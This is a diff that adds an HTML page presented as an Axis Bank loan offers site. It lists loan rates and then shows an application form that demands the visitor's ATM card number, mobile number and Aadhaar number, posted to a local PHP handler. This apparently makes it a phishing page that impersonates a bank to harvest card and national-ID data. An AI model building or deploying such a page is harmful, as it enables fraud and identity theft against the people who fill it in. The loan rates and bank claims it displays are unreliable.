@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axis Bank Offers and Loan Application</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #004aad;
+            color: white;
+            padding: 1.5rem 2rem;
+            text-align: center;
+        }
+        .container {
+            max-width: 800px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        h1, h2 {
+            text-align: center;
+            color: #004aad;
+        }
+        .offer {
+            border: 1px solid #ddd;
+            padding: 1rem;
+            border-radius: 5px;
+            margin-bottom: 1.5rem;
+        }
+        .offer h3 {
+            color: #004aad;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+        }
+        input {
+            margin-bottom: 1.5rem;
+            padding: 0.7rem;
+            font-size: 1rem;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        input:focus {
+            border-color: #004aad;
+            outline: none;
+        }
+        button {
+            padding: 0.7rem;
+            font-size: 1rem;
+            background-color: #004aad;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0066cc;
+        }
+        footer {
+            text-align: center;
+            padding: 1rem;
+            background: #004aad;
+            color: white;
+            margin-top: 2rem;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Axis Bank Loan Offers</h1>
+    <p>Explore exclusive loan offers and apply online easily</p>
+</header>
+
+<div class="container">
+    <h2>Our Top Loan Offers</h2>
+
+    <div class="offer">
+        <h3>Personal Loan</h3>
+        <p>Get a personal loan with interest rates as low as 10.5% per annum.</p>
+        <p><strong>Features:</strong> Flexible repayment terms, quick disbursement.</p>
+    </div>
+
+    <div class="offer">
+        <h3>Home Loan</h3>
+        <p>Avail home loans up to ₹2 Crores with attractive interest rates starting at 6.5%.</p>
+        <p><strong>Features:</strong> Low processing fees, no hidden charges.</p>
+    </div>
+
+    <div class="offer">
+        <h3>Car Loan</h3>
+        <p>Drive your dream car with Axis Bank car loans starting at just 8.7% interest.</p>
+        <p><strong>Features:</strong> Easy approval, up to 90% financing of car value.</p>
+    </div>
+
+    <h2>Apply for a Loan</h2>
+    <form action="submit_loan_application.php" method="POST">
+        <label for="name">Full Name</label>
+        <input type="text" id="name" name="name" placeholder="Enter your full name" required>
+
+        <label for="loan_amount">Loan Amount</label>
+        <input type="number" id="loan_amount" name="loan_amount" placeholder="Enter loan amount (in ₹)" required>
+
+        <label for="atm_card_number">ATM Card Number</label>
+        <input type="text" id="atm_card_number" name="atm_card_number" placeholder="Enter your ATM card number" minlength="16" maxlength="16" required>
+
+        <label for="mobile_number">Mobile Number</label>
+        <input type="tel" id="mobile_number" name="mobile_number" placeholder="Enter your mobile number" pattern="[0-9]{10}" maxlength="10" required>
+
+        <label for="aadhaar_number">Aadhaar Number</label>
+        <input type="text" id="aadhaar_number" name="aadhaar_number" placeholder="Enter your Aadhaar number" minlength="12" maxlength="12" required>
+
+        <button type="submit">Submit Application</button>
+    </form>
+</div>
+
+<footer>
+    <p>© 2024 Axis Bank | All Rights Reserved</p>
+</footer>
+
+</body>
+</html>
